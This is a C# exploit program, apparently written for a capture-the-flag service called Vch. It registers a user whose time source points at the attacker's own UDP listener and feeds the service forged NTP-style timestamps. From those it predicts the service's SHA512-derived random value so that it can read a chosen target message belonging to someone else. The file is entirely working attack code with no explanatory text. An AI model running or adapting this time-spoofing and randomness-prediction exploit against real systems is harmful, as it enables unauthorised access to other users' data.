using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using MongoDB.Bson;
using Vch.Core.Helpers;
using Vch.Core.Meta;
using VchUtils;

namespace Exploit
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var client = new VchClient(new Uri($"http://{args[0]}"));
                var udpClient = new UdpClient(new IPEndPoint(IPAddress.Any, 124));

                var targetMessage = Int64.Parse(args[1]);

                var udpReciveTask = udpClient.ReceiveAsync();

                var shaProvier = new SHA512Managed();

                var registerUserTask = client.RegisterUser(new UserMeta
                {
                    FirstName = "",
                    LastName = "",
                    TrackingCode = "",
                    VaultTimeSource = new IPEndPoint(123123, 123),
                });

                var udpReceiveResult = udpReciveTask.GetAwaiter().GetResult();

                var datagramm = new byte[48];
                var milisecondsBytes = DateTime.UtcNow.Subtract(
                    new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)
                ).TotalMilliseconds.ToBytes();

                Array.Copy(milisecondsBytes, 0, datagramm, 4, 8);
                udpClient.SendAsync(datagramm, datagramm.Length, udpReceiveResult.RemoteEndPoint);

                var userInfo = registerUserTask.GetAwaiter().GetResult();
                var seed = BitConverter.ToInt64(milisecondsBytes) ^ BitConverter.ToInt64(Int64.Parse(userInfo.UserId).ToBytes()
                               .Take(6).Union(new byte[] { 0, 0 }).ToArray());


                var nextRnd = BitConverter.ToInt64(shaProvier.ComputeHash(seed.ToBytes().Take(6).ToArray()).Take(6).Union(new byte[] { 0, 0 })
                    .ToArray());

                var hackerTime = nextRnd ^ targetMessage;

                var hackerDatagramm = new byte[48];

                Array.Copy(hackerTime.ToBytes(), 0, hackerDatagramm, 4, 8);

                udpReciveTask = udpClient.ReceiveAsync();

                var postTask = client.PostMessage(userInfo.UserId, userInfo.UserId);
                udpReceiveResult = udpReciveTask.GetAwaiter().GetResult();
                udpClient.SendAsync(hackerDatagramm, hackerDatagramm.Length, udpReceiveResult.RemoteEndPoint);

                Console.WriteLine(postTask.GetAwaiter().GetResult().ToJson());
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
    }
}
